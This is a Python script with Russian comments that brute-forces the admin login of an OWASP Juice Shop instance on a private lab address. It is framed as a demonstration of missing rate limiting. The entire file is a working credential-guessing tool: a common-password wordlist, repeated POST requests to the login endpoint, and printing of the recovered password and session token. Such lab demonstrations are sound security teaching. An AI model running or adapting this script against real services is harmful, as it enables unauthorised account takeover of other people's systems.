#!/usr/bin/env python3
"""
Brute-force атака на логин Juice Shop
Демонстрация отсутствия rate limiting (Insecure Design - A04:2021)
"""
import requests
import time
import sys
import json

TARGET = "http://172.20.0.106:3000"
EMAIL = "admin@juice-sh.op"
PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "111111", "iloveyou", "master", "sunshine",
    "ashley", "bailey", "passw0rd", "shadow", "123123",
    "admin123", "admin", "password123", "welcome", "login"
]

def attempt_login(email, password):
    """Попытка входа с указанными учетными данными"""
    url = f"{TARGET}/rest/user/login"
    payload = {"email": email, "password": password}
    
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code, response.json()
    except requests.exceptions.RequestException as e:
        return None, str(e)
    except json.JSONDecodeError:
        return response.status_code, {"error": "Invalid JSON response"}

def analyze_response_time(start_time, end_time):
    """Анализ времени ответа для обнаружения timing attacks"""
    response_time = end_time - start_time
    if response_time > 2.0:
        return f"SLOW ({response_time:.2f}s) - возможна timing attack"
    return f"{response_time:.2f}s"

def main():
    print("=" * 70)
    print("Juice Shop Login Brute-Force Attack")
    print("Demonstrating Insecure Design: No Rate Limiting (A04:2021)")
    print("=" * 70)
    print(f"[*] Target: {TARGET}")
    print(f"[*] Email: {EMAIL}")
    print(f"[*] Password wordlist size: {len(PASSWORDS)}")
    print("\n[!] Attack demonstrates lack of rate limiting protection")
    print("[!] Real application should block after 3-5 failed attempts")
    print("-" * 70)
    
    attempt = 0
    start_time = time.time()
    failed_attempts = 0
    successful_password = None
    token = None
    
    for password in PASSWORDS:
        attempt += 1
        print(f"[{attempt:2d}/{len(PASSWORDS)}] Password: {password:15s}...", end=" ", flush=True)
        
        request_start = time.time()
        status, response = attempt_login(EMAIL, password)
        request_end = time.time()
        
        response_time_info = analyze_response_time(request_start, request_end)
        
        if status == 200 and "authentication" in str(response):
            print("✓ SUCCESS!")
            successful_password = password
            token = response.get("authentication", {}).get("token", "")
            break
        else:
            failed_attempts += 1
            if status == 401:
                print(f"✗ Failed (401 Unauthorized) [{response_time_info}]")
            elif status is None:
                print(f"✗ Error: {response}")
            else:
                print(f"✗ Failed (Status: {status}) [{response_time_info}]")
        
        # Небольшая задержка для имитации человеческого поведения
        time.sleep(0.3)
    
    total_time = time.time() - start_time
    
    print("\n" + "=" * 70)
    
    if successful_password:
        print("[+] LOGIN SUCCESSFUL!")
        print(f"[+] Email: {EMAIL}")
        print(f"[+] Password: {successful_password}")
        print(f"[+] Failed attempts before success: {failed_attempts}")
        print(f"[+] Total time elapsed: {total_time:.2f} seconds")
        print(f"[+] Average requests per second: {attempt/total_time:.2f}")
        
        if token:
            print(f"[+] JWT Token: {token[:50]}...")
            print(f"[+] Token length: {len(token)} characters")
            
        print("\n[!] SECURITY VULNERABILITIES DETECTED:")
        print("[!] ✓ No account lockout after multiple failures")
        print("[!] ✓ No CAPTCHA to prevent automation")
        print("[!] ✓ No rate limiting detected")
        print("[!] ✓ Weak credentials allowed")
        
    else:
        print(f"[-] BRUTE FORCE COMPLETED - No valid password found")
        print(f"[-] Total attempts: {attempt}")
        print(f"[-] Total time: {total_time:.2f} seconds")
        print(f"[-] Requests per second: {attempt/total_time:.2f}")
        print(f"\n[!] SYSTEM ANALYSIS:")
        print(f"[!] ✓ No rate limiting detected ({attempt} attempts accepted)")
        print(f"[!] ✓ No account lockout mechanism")
        print(f"[!] ✓ System vulnerable to brute-force attacks")
    
    print("=" * 70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)
